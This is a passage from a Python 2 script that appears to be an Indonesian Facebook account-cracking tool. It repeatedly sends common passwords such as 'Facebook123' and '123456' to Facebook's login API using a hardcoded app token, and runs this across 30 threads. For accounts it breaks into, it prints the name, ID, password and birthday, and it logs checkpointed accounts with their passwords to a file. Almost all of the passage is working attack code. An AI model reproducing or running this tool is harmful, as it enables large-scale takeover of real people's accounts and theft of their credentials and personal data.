															cekpoint.append(user+pass6)
														else:
															pass7 = 'Facebook123'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															w = json.load(data)
															if 'access_token' in w:
																x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
																z = json.loads(x.text)
																print '\x1c\033[1;94m[•🍒•] \x1c\033[1;92mHack100%🍁'
																print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mName \x1c\033[1;91m    🍏 \x1c\033[1;92m' + c['name']
																print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
																print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass7 + '\n'
																print '\x1c\033[1;97m[•🍎•] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m🍏 \x1c\033[1;92m' + c['birthday']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in w['error_msg']:
																	print '\x1c\033[1;94m[•🍒•] \x1c\033[1;94mCheckpoint'
																	print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mName \x1c\033[1;94m    🍏 \x1c\033[1;95m' + c['name']
																	print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
																	print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass7 + '\n'
																	print '\x1c\033[1;97m[•🍎•] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m🍏 \x1c\033[1;92m' + c['birthday']
																	cek = open("out/super_cp.txt", "a")
																	cek.write("ID:" +user+ " Pw:" +pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																else:
																	pass8 = 'Facebook1234'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	w = json.load(data)
																	if 'access_token' in w:
																		x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
																		z = json.loads(x.text)
																		print '\x1c\033[1;94m[•🍒•] \x1c\033[1;92mHack100%🍁'
																		print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mName \x1c\033[1;91m    🍏 \x1c\033[1;92m' + c['name']
																		print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
																		print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass8 + '\n'
																		print '\x1c\033[1;97m[•🍎•] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m🍏 \x1c\033[1;92m' + c['birthday']
																		oks.append(user+pass8)
																	else:
																		if 'www.facebook.com' in w['error_msg']:
																			print '\x1c\033[1;94m[•🍒•] \x1c\033[1;94mCheckpoint'
																			print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mName \x1c\033[1;94m    🍏 \x1c\033[1;95m' + c['name']
																			print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
																			print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass8 + '\n'
																			print '\x1c\033[1;97m[•🍎•] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m🍏 \x1c\033[1;92m' + c['birthday']
																			cek = open("out/super_cp.txt", "a")
																			cek.write("ID:" +user+ " Pw:" +pass8+"\n")
																			cek.close()
																			cekpoint.append(user+pass8)
																		else:
																				pass9 = 'Facebook12345'
																				data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																				w = json.load(data)
																				if 'access_token' in w:
																					x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
																					z = json.loads(x.text)
																					print '\x1c\033[1;94m[•🍒•] \x1c\033[1;92mHack100%🍁'
																					print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mName \x1c\033[1;91m    🍏 \x1c\033[1;92m' + c['name']
																					print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
																					print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass9 + '\n'
																					print '\x1c\033[1;97m[•🍎•] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m🍏 \x1c\033[1;92m' + c['birthday']
																					oks.append(user+pass9)
																				else:
																					if 'www.facebook.com' in w['error_msg']:
																						print '\x1c\033[1;94m[•🍒•] \x1c\033[1;94mCheckpoint'
																						print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mName \x1c\033[1;94m    🍏 \x1c\033[1;95m' + c['name']
																						print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
																						print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass9 + '\n'
																						print '\x1c\033[1;97m[•🍎•] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m🍏 \x1c\033[1;92m' + c['birthday']
																						cek = open("out/super_cp.txt", "a")
																						cek.write("ID:" +user+ " Pw:" +pass9+"\n")
																						cek.close()
																						cekpoint.append(user+pass9)
																					else:
																						pass10 = '123456789'
																						data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																						w = json.load(data)
																						if 'access_token' in w:
																							x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
																							z = json.loads(x.text)
																							print '\x1c\033[1;94m[•🍒•] \x1c\033[1;92mHack100%🍁'
																							print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mName \x1c\033[1;91m    🍏 \x1c\033[1;92m' + c['name']
																							print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
																							print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass10 + '\n'
																							print '\x1c\033[1;97m[•🍎•] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m🍏 \x1c\033[1;92m' + c['birthday']
																							oks.append(user+pass10)
																						else:
																							if 'www.facebook.com' in w['error_msg']:
																								print '\x1c\033[1;94m[•🍒•] \x1c\033[1;94mCheckpoint'
																								print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mName \x1c\033[1;94m    🍏 \x1c\033[1;95m' + c['name']
																								print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
																								print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass10 + '\n'
																								print '\x1c\033[1;97m[•🍎•] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m🍏 \x1c\033[1;92m' + c['birthday']
																								cek = open("out/super_cp.txt", "a")
																								cek.write("ID:" +user+ " Pw:" +pass10+"\n")
																								cek.close()
																								cekpoint.append(user+pass10)
																							else:
																								pass11 = '123456'
																								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																								w = json.load(data)
																								if 'access_token' in w:
																									x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
																									z = json.loads(x.text)
																									print '\x1c\033[1;94m[•🍒•] \x1c\033[1;92mHack100%🍁'
																									print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mName \x1c\033[1;91m    🍏 \x1c\033[1;92m' + c['name']
																									print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
																									print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass11 + '\n'
																									print '\x1c\033[1;97m[•🍎•] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m🍏 \x1c\033[1;92m' + c['birthday']
																									oks.append(user+pass11)
																								else:
																									if 'www.facebook.com' in w['error_msg']:
																										print '\x1c\033[1;94m[•🍒•] \x1c\033[1;94mCheckpoint'
																										print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mName \x1c\033[1;94m    🍏 \x1c\033[1;95m' + c['name']
																										print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
																										print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass11 + '\n'
																										print '\x1c\033[1;97m[•🍎•] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m🍏 \x1c\033[1;92m' + c['birthday']
																										cek = open("out/super_cp.txt", "a")
																										cek.write("ID:" +user+ " Pw:" +pass11+"\n")
																										cek.close()
																										cekpoint.append(user+pass11)
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;34m████████████████████████████████████████████████"
	print '\033[1;97m[\033[1;93m🍒\033[1;97m] \033[1;97mSelesai ....'
	print"\033[1;97m[\033[1;93m🍒\033[1;97m] \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m[\033[1;93m🍒\033[1;97m] \033[1;97mCP file tersimpan : out/ind1.txt'
	print "\033[1;34m████████████████████████████████████████████████"
	raw_input("\033[1;93m[\033[1;97m Kembali \033[1;93m]")
	os.system("python2 SYBER-PUNK.py")
	

	
			
if __name__=='__main__':
        menu()
        masuk()
